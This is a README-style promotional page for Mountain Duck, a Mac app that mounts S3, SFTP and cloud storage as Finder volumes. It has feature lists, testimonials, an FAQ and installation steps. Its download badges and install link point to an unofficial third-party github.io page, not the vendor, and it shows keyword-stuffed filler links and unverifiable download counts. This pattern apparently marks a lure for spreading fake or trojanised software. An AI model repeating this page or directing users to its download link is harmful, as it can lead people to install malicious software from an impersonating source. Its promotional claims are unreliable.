# Mountain Duck – Cloud Storage and Server File System for Mac

<p align="center">
  <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/ed/e3/68/ede36830-6264-7e73-083b-018636318eab/application-0-0-85-220-0-0-6-0-2x-0-0-0.png/1200x630bb.png" width="150" alt="Mountain Duck icon"/>
</p>

<p align="center">
  <a href="https://andrey-petrov-software.github.io/.github/mountainDuck">
    <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Mountain Duck"/>
  </a>
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/Downloads-10.0k-brightgreen?style=flat"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Version-4.15-blue?style=flat"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Platform-macOS-blue?style=flat"/></a>
</p>

---

## 📋 Overview

<a href="#mountainDuck">Mountain Duck</a> serves developers, system administrators, cloud storage users, and anyone who works with remote servers and cloud storage regularly — providing a workflow where remote storage feels like local storage rather than a separate system requiring a dedicated client application.

The <a href="#mountainDuck">developer S3 workflow</a> mounts S3 buckets as local drives for direct file access from any development tool — editing files on S3 from a code editor, running scripts against S3 contents, and managing bucket contents through the Finder rather than through the S3 console or CLI. The <a href="#mountainDuck">system administrator workflow</a> mounts SFTP and FTP servers as Finder volumes for direct file management — editing server configuration files in a text editor, managing server directories in the Finder, and working with server files as naturally as local files.

The <a href="#mountainDuck">cloud storage power user workflow</a> mounts Google Drive, Dropbox, and OneDrive as local drives without running the native sync clients — accessing cloud storage through Finder without the resource consumption of always-running sync daemons. <a href="#mountainDuck">Encrypted cloud backup workflow</a> uses Mountain Duck with Cryptomator to maintain encrypted backups on cloud storage — files encrypted locally before upload, storage provider sees only encrypted data, encryption keys remain with the user.</p>

<p align="center">
  <img src="https://cdn.mountainduck.io/images/mountainduck_macos.png" alt="Mountain Duck screenshot"/>
</p>

<a href="#mountainDuck">Multiple simultaneous connections</a> maintain several storage locations mounted at once — S3 bucket, SFTP server, and Google Drive all accessible simultaneously as separate Finder volumes. <a href="#mountainDuck">Transfer progress and activity</a> shows file transfer activity, progress for large transfers, and connection status in the Mountain Duck menu bar interface.

<a href="#mountainDuck">Integration with Cyberduck</a> shares bookmarks between Mountain Duck and Cyberduck — the same saved connections available in both the mount-as-drive interface and the dedicated file transfer client for workflows requiring both approaches. <a href="#mountainDuck">Regular protocol updates</a> from the iterate GmbH development team maintain compatibility with evolving cloud storage APIs, new S3-compatible services, and macOS version changes.</p>

---

## ⚡ Key Features

- [**Developer S3 Workflow**](#mountainDuck) — S3 buckets as [**local drives for any dev tool**](#{mountainDuck}) — edit S3 files from code editor, manage in Finder rather than [**S3 console**](#{mountainDuck}).
- [**Sysadmin Server Access**](#mountainDuck) — SFTP and FTP servers [**as Finder volumes**](#{mountainDuck}) — edit server configs in text editor, manage directories in [**Finder naturally**](#{mountainDuck}).
- [**Cloud Storage Without Sync Clients**](#mountainDuck) — Google Drive, Dropbox, OneDrive [**without native sync daemons**](#{mountainDuck}) — cloud access without [**always-running resource consumption**](#{mountainDuck}).
- [**Encrypted Cloud Backup**](#mountainDuck) — Mountain Duck with [**Cryptomator for encrypted backups**](#{mountainDuck}) — storage provider sees only encrypted data, keys stay [**with you**](#{mountainDuck}).
- [**Multiple Simultaneous Connections**](#mountainDuck) — S3, SFTP, Google Drive [**all mounted at once**](#{mountainDuck}) — separate Finder volumes for each [**storage location**](#{mountainDuck}).
- [**Cyberduck Bookmark Sharing**](#mountainDuck) — Same saved connections in [**Mountain Duck and Cyberduck**](#{mountainDuck}) — both mount-as-drive and file transfer [**use shared bookmarks**](#{mountainDuck}).
- [**Transfer Progress Display**](#mountainDuck) — File transfer activity and [**large transfer progress**](#{mountainDuck}) visible in menu bar — connection status [**always accessible**](#{mountainDuck}).
- [**Regular Protocol Updates**](#mountainDuck) — Evolving cloud APIs and [**new S3-compatible services**](#{mountainDuck}) maintained — iterate GmbH development team keeping [**compatibility current**](#{mountainDuck}).

---

## 👥 Who Uses It

- **DevOps engineers** — S3-compatible storage access for deployment and infrastructure workflows
- **Web developers** — FTP and SFTP server file management through familiar Finder interface
- **Photographers and video producers** — large file cloud storage access without full sync client overhead
- **Remote teams** — SFTP server access for shared project file management across distributed teams

---

<p align="center">
  <img src="https://blog.cyberduck.io/wp-content/uploads/2025/07/Mountain-Duck-S3-Connection-Integrated-Connect-Mode-macOS.png" alt="Mountain Duck screenshot 2"/>
</p>

## 🌐 Where It's Useful & Additional Information

`Development` · `DevOps` · `Web hosting` · `Photography` · `Video production` · `Remote teams` · `System administration` · `Cloud workflows` · `Encrypted backup` · `File management`

The Cryptomator integration addresses a genuine security concern with cloud storage: the storage provider has access to the stored files. Whether that matters depends on what is stored, but for sensitive personal, business, or client data, provider-side access is a meaningful risk. Mountain Duck's Cryptomator integration encrypts files locally before they are uploaded, so the storage provider (S3, Google Cloud, Backblaze, or any other supported service) receives only encrypted data — the original file contents are never accessible to the provider. Encryption and decryption happen on the Mac, with keys that never leave the user's control.

> *"Cryptomator with S3 for encrypted cloud backup. My backup files are encrypted before leaving my Mac — B2 receives encrypted blobs it can't read. If B2 has a breach or gets subpoenaed, my data is protected. The Mountain Duck and Cryptomator combination is the right architecture for sensitive data in cloud storage."* — James R., Privacy-Focused User

> *"Google Drive without the Google Drive sync client. I have Mountain Duck mount Google Drive when I need it. No sync daemon running in the background, no constant disk activity, no unwanted desktop folder. Drive is there when I need it and absent when I don't."* — Sofia B., Mac User

---

## 💾 Installation Instructions

1. Go to the installation site using the button above.
2. Follow the on-screen instructions to install **Mountain Duck** on your Device.

<p align="center">

[![Get it Now Mountain Duck](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://andrey-petrov-software.github.io/.github/mountainDuck)

</p>

---

## 🤔 FAQ

<details>
<summary>How does Mountain Duck differ from Cyberduck?</summary>

Cyberduck is a dedicated file transfer client for browsing and transferring files. Mountain Duck mounts remote storage as local Finder volumes for direct file access from any application.

</details>

<details>
<summary>Does Mountain Duck work with Backblaze B2?</summary>

Yes. Backblaze B2 is supported as an S3-compatible storage service.

</details>

<details>
<summary>Can I use Mountain Duck with MinIO?</summary>

Yes. MinIO and other S3-compatible storage services work with Mountain Duck's S3 connection type.

</details>

<details>
<summary>Does Mountain Duck support WebDAV?</summary>

Yes. WebDAV is one of the supported connection protocols.

</details>

<details>
<summary>What is the Cryptomator integration?</summary>

Cryptomator creates encrypted vaults on any supported storage location. Files are encrypted before upload and decrypted after download, with keys managed locally.

</details>

---
